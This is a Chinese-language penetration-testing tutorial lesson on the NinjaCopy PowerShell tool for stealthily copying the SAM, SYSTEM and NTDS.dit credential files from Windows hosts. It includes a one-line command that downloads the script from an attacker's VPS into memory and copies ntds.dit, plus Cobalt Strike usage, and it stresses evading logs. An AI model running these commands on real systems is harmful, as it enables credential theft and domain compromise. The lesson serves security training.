# 网络安全系统教程：P44：31.NinjaCopy工具使用详解 🔧

在本节课中，我们将学习一个名为NinjaCopy的PowerShell脚本工具。该工具的主要功能是获取目标系统中的关键文件，例如SAM、SYSTEM和NTDS.dit。特别需要注意的是，该工具在操作过程中不会调用Volume Shadow Copy服务，因此不会产生相关的日志文件，这有助于在渗透测试中保持隐蔽性。

## 工具简介与基本使用

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_1.png)

NinjaCopy是一个PowerShell脚本。我们可以直接使用它来获取所需的三个文件。具体使用时，如果你已经将脚本上传到目标系统，可以在PowerShell环境中通过导入模块的方式来调用其功能。

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_3.png)

以下是基本使用步骤：
首先，需要导入模块，将PowerShell脚本中的功能导入到当前会话中。导入后，就可以直接调用脚本中声明的函数和方法，主要使用的是`Invoke-NinjaCopy`。

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_5.png)

其基本命令格式如下：
```powershell
Invoke-NinjaCopy -Path “<目标文件路径>” -LocalDestination “<本地保存路径>”
```
其中，`-Path`参数指定要获取的文件路径，`-LocalDestination`参数指定文件复制到本地的路径和文件名。

## 远程加载脚本执行

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_42.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_43.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_44.png)

除了将脚本上传到目标本地执行，以及在CS中导入执行外，我们还可以通过远程加载的方式来执行NinjaCopy脚本。

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_46.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_48.png)

这种方法的核心是，不将脚本文件本身放置于目标机器，而是让目标机器从我们控制的远程服务器（如VPS）下载脚本到内存中并执行。

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_49.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_51.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_53.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_54.png)

以下是实现远程加载的一种命令示例：
```powershell
IEX (New-Object Net.WebClient).DownloadString(‘http://<你的VPS地址>/NinjaCopy.ps1’); Invoke-NinjaCopy -Path “C:\Windows\NTDS\ntds.dit” -LocalDestination “C:\Windows\Temp\ntds.dit”
```
这条命令的作用是：
1.  `IEX` 是 `Invoke-Expression` 的别名，用于执行字符串中的命令。
2.  `(New-Object Net.WebClient).DownloadString(‘URL’)` 会从指定的URL下载脚本内容到内存中。
3.  下载并导入脚本后，紧接着调用 `Invoke-NinjaCopy` 方法执行文件复制操作。

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_56.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_57.png)

在使用此方法时，必须确保你的VPS上的Web服务（承载脚本的HTTP服务）是正常运行的，并且目标机器能够访问该URL。如果执行报错（如“无法连接到远程服务器”），就需要检查网络连通性和Web服务状态。

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_59.png)

## 总结

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_61.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_63.png)

本节课中我们一起学习了NinjaCopy工具的三种主要使用方式：
1.  **本地执行**：在目标系统的PowerShell中直接导入并执行脚本。
2.  **Cobalt Strike集成**：利用CS的`powershell-import`和`powershell`命令，在已控会话中方便地调用脚本功能。
3.  **远程加载**：通过一行命令让目标机从远程服务器下载脚本到内存中执行，无需在磁盘留下脚本文件，更具隐蔽性。

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_65.png)

![](img/68c5bd0194157e0abf262e3d8b8aa5c1_67.png)

这三种方式本质上是脚本加载方式的不同，但核心调用的都是`Invoke-NinjaCopy`这个函数。掌握这些方法，可以帮助你在不同的渗透测试场景下，灵活、隐蔽地获取目标系统的重要文件。
